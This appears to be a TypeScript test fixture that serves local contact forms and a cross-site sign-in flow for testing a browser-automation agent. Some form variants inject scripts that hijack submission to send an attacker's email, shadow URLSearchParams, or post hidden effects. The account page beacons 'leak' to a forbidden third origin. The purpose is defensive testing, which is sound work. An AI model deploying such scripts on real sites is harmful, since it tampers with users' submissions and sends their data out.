export const BROWSER_VARIANTS = [
  'baseline',
  'reordered',
  'renamed_label',
  'unknown_required',
  'ambiguous_save',
  'takeover',
] as const;
export type BrowserVariant = (typeof BROWSER_VARIANTS)[number];

/** Local, independent native forms. The effect ledger lives at the destination, outside the controller. */
export function startBrowserFixture() {
  const effects: Array<{ run: string; fields: Record<string, string> }> = [];
  const requests: Array<{ path: string; method: string }> = [];
  const server = Bun.serve({
    hostname: '127.0.0.1',
    port: 0,
    async fetch(request) {
      const url = new URL(request.url);
      requests.push({ path: url.pathname, method: request.method });
      if (url.pathname === '/redirect')
        return new Response(null, {
          status: 302,
          headers: {
            location: `/form/baseline${url.search}`,
            'set-cookie': 'fixture=kept; Path=/',
          },
        });
      if (url.pathname === '/effect' && request.method === 'POST') {
        const body = new URLSearchParams(await request.text());
        effects.push({ run: url.searchParams.get('run') ?? '', fields: Object.fromEntries(body) });
        return new Response(
          '<!doctype html><html lang="en"><body><h1>Saved</h1><p>The form was saved.</p></body></html>',
          { headers: { 'content-type': 'text/html' } },
        );
      }
      if (!url.pathname.startsWith('/form/')) return new Response('Not found', { status: 404 });
      const variant = url.pathname.slice('/form/'.length);
      const emailLabel = variant === 'renamed_label' ? 'Email address' : 'Email';
      const name =
        variant === 'multiline'
          ? '<label for="name">Name</label><textarea id="name" name="person_name" required></textarea>'
          : '<label for="name">Name</label><input id="name" name="person_name" required>';
      const email = `<label for="email">${emailLabel}</label><input id="email" name="email" type="email" required>`;
      const fields = variant === 'reordered' ? email + name : name + email;
      const extra =
        variant === 'unknown_required'
          ? '<label for="year">Birth year</label><input id="year" name="year" required>'
          : '';
      const auth =
        variant === 'credentials'
          ? '<label for="password">Password</label><input id="password" type="password" autocomplete="current-password"><label for="otp">Verification code</label><input id="otp" autocomplete="one-time-code">'
          : '';
      const duplicate = variant === 'ambiguous_save' ? '<button type="submit">Save</button>' : '';
      const hidden =
        variant === 'hidden_destination'
          ? '<input type="hidden" name="destination_picker_7" value="hidden@example.test">'
          : '';
      const endpoint = `/effect?run=${encodeURIComponent(url.searchParams.get('run') ?? '')}`;
      const malicious =
        variant === 'reversible_effect'
          ? `<button type="button" id="bad">Change view</button><script>document.getElementById('bad').onclick=()=>fetch(${JSON.stringify(endpoint)},{method:'POST',body:'bad=1'}).catch(()=>{});</script>`
          : '';
      const tamper = ['tampered_submit', 'shadowed_serializer'].includes(variant)
        ? `<script>document.querySelector('form').onsubmit=e=>{e.preventDefault();fetch(${JSON.stringify(endpoint)},{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'person_name=changed&email=attacker%40example.com'}).catch(()=>{});};</script>`
        : '';
      const serializer =
        variant === 'shadowed_serializer'
          ? `<script>window.URLSearchParams=class { toString(){return 'person_name=changed&email=attacker%40example.com';} };</script>`
          : '';
      const rename =
        variant === 'label_transition'
          ? `<script>document.getElementById('name').addEventListener('input',()=>{document.querySelector('label[for="email"]').textContent='Contact email';});</script>`
          : '';
      return new Response(
        `<!doctype html><html lang="en"><head><meta charset="UTF-8"><title>Browser fixture ${variant}</title></head><body><h1>Contact form</h1><form method="post" action="${endpoint}">${fields}${extra}${auth}${hidden}<button type="submit">Save</button>${duplicate}</form>${malicious}${tamper}${rename}${serializer}</body></html>`,
        { headers: { 'content-type': 'text/html' } },
      );
    },
  });
  return {
    server,
    effects,
    requests,
    url: server.url.origin,
    close: () => server.stop(true),
  };
}

export const SIGN_IN = {
  password: 'correct horse battery staple',
  code: '482913',
  backup_code: 'ABCD-EFGH-IJKL',
  reference: '48291377',
} as const;

/** Where a scripted person clicks: the centre of each control in the 1024x768 viewport. */
export const SIGN_IN_POINTS = {
  first_field: { x: 260, y: 140 },
  upload: { x: 260, y: 220 },
  help: { x: 180, y: 300 },
  activity: { x: 180, y: 360 },
  close_help: { x: 180, y: 140 },
  back_to_account: { x: 200, y: 260 },
} as const;

export type SignInRequest = {
  site: 'app' | 'idp' | 'other';
  method: string;
  path: string;
  search: string;
  body: string;
  cookie: string;
};

const box = (top: number, width = 320) =>
  `position:absolute;left:100px;top:${top}px;width:${width}px;height:40px;box-sizing:border-box`;

function page(title: string, body: string, headers: Record<string, string> = {}) {
  return new Response(
    `<!doctype html><html lang="en"><head><meta charset="UTF-8"><title>${title}</title></head><body style="margin:0;font:16px sans-serif">${body}</body></html>`,
    { headers: { 'content-type': 'text/html', ...headers } },
  );
}

/**
 * A sign-in that crosses two sites, on literal loopback origins: a password form, a one-time
 * code, a redirect to an identity provider on another address and back, then an account page
 * that also reaches for a third, never-allowed address. The ledger is kept at the destinations.
 */
export function startSignInFixture() {
  const requests: SignInRequest[] = [];
  const tickets = new Set<string>();
  const record = async (site: SignInRequest['site'], request: Request) => {
    const url = new URL(request.url);
    requests.push({
      site,
      method: request.method,
      path: url.pathname,
      search: url.search,
      body: request.method === 'GET' ? '' : await request.text(),
      cookie: request.headers.get('cookie') ?? '',
    });
    return { url, entry: requests[requests.length - 1] as SignInRequest };
  };
  const other = Bun.serve({
    hostname: '127.0.0.3',
    port: 0,
    async fetch(request) {
      await record('other', request);
      return new Response('other', { headers: { 'content-type': 'text/plain' } });
    },
  });
  const otherOrigin = other.url.origin;
  let appOrigin = '';
  const idp = Bun.serve({
    hostname: '127.0.0.2',
    port: 0,
    async fetch(request) {
      const { url } = await record('idp', request);
      const back = url.searchParams.get('return') ?? '';
      if (url.pathname !== '/idp' || !back.startsWith(`${appOrigin}/`))
        return new Response('Unknown return address', { status: 400 });
      const ticket = crypto.randomUUID();
      tickets.add(ticket);
      return new Response(null, {
        status: 302,
        headers: { location: `${back}?ticket=${ticket}`, 'set-cookie': 'idp=seen; Path=/' },
      });
    },
  });
  const app = Bun.serve({
    hostname: '127.0.0.1',
    port: 0,
    async fetch(request) {
      const { url, entry } = await record('app', request);
      const cookie = entry.cookie;
      const form = new URLSearchParams(entry.body);
      if (url.pathname === '/signin' && request.method === 'GET')
        return page(
          'Sign in',
          `<h1 style="${box(20, 600)}">Sign in to the fixture</h1><form method="post" action="/signin"><label for="password" style="${box(80)}">Password</label><input id="password" name="password" type="password" autocomplete="current-password" style="${box(120)}"><button type="submit" style="${box(180, 160)}">Continue</button></form><a href="/account" style="${box(240, 200)}">Back to your account</a>`,
        );
      if (url.pathname === '/signin' && request.method === 'POST')
        return form.get('password') === SIGN_IN.password
          ? new Response(null, {
              status: 303,
              headers: { location: '/otp', 'set-cookie': 'step=password; Path=/; HttpOnly' },
            })
          : page('Sign in', '<p>That password did not match.</p>');
      if (url.pathname === '/otp' && request.method === 'GET')
        return cookie.includes('step=password')
          ? page(
              'One-time code',
              `<form method="post" action="/otp"><label for="code" style="${box(80)}">One-time code</label><input id="code" name="code" autocomplete="one-time-code" inputmode="numeric" style="${box(120)}"><button type="submit" style="${box(180, 160)}">Verify</button></form>`,
            )
          : new Response(null, { status: 303, headers: { location: '/signin' } });
      if (url.pathname === '/otp' && request.method === 'POST')
        return cookie.includes('step=password') && form.get('code') === SIGN_IN.code
          ? new Response(null, {
              status: 302,
              headers: {
                location: `${idp.url.origin}/idp?return=${encodeURIComponent(`${appOrigin}/account`)}`,
                'set-cookie': 'step=code; Path=/; HttpOnly',
              },
            })
          : page('One-time code', '<p>That code did not match.</p>');
      if (url.pathname === '/account') {
        const ticket = url.searchParams.get('ticket') ?? '';
        const signedIn =
          cookie.includes('session=signed-in') ||
          (cookie.includes('step=code') && tickets.delete(ticket));
        if (!signedIn) return new Response(null, { status: 303, headers: { location: '/signin' } });
        return page(
          'Your account',
          `<h1 style="${box(20, 600)}">Your account</h1><label for="note" style="${box(80)}">Note</label><input id="note" name="note" style="${box(120)}"><input id="upload" type="file" aria-label="Attach a file" style="${box(200)}"><button id="help" type="button" style="${box(280, 160)}">Open help</button><button id="activity" type="button" style="${box(340, 160)}">Show activity</button><p style="${box(420, 600)}">Backup code: ${SIGN_IN.backup_code}</p><p style="${box(470, 600)}">Order reference ${SIGN_IN.reference}</p><div id="bar" style="position:absolute;left:100px;top:540px;width:40px;height:20px;background:#357"></div><img alt="" src="${otherOrigin}/pixel.gif" style="${box(600, 10)}"><script>
const upload = document.getElementById('upload');
upload.addEventListener('cancel', () => fetch('/chooser?event=cancel'));
upload.addEventListener('change', () => fetch('/chooser?event=change'));
document.getElementById('help').addEventListener('click', () => window.open('/help', 'help'));
document.getElementById('activity').addEventListener('click', () => {
  const bar = document.getElementById('bar');
  let x = 0;
  const step = () => { x = (x + 7) % 800; bar.style.left = (100 + x) + 'px'; requestAnimationFrame(step); };
  requestAnimationFrame(step);
});
fetch(${JSON.stringify(`${otherOrigin}/beacon`)}, { method: 'POST', body: 'leak' }).catch(() => {});
</script>`,
          { 'set-cookie': 'session=signed-in; Path=/; HttpOnly' },
        );
      }
      if (url.pathname === '/help')
        return page(
          'Help',
          `<h1 style="${box(20, 600)}">Help</h1><button id="done" type="button" onclick="window.close()" style="${box(120, 160)}">Close help</button>`,
        );
      if (url.pathname === '/chooser') return new Response(null, { status: 204 });
      return new Response('Not found', { status: 404 });
    },
  });
  appOrigin = app.url.origin;
  return {
    requests,
    app: appOrigin,
    idp: idp.url.origin,
    other: otherOrigin,
    close: async () => {
      await Promise.all([app.stop(true), idp.stop(true), other.stop(true)]);
    },
  };
}
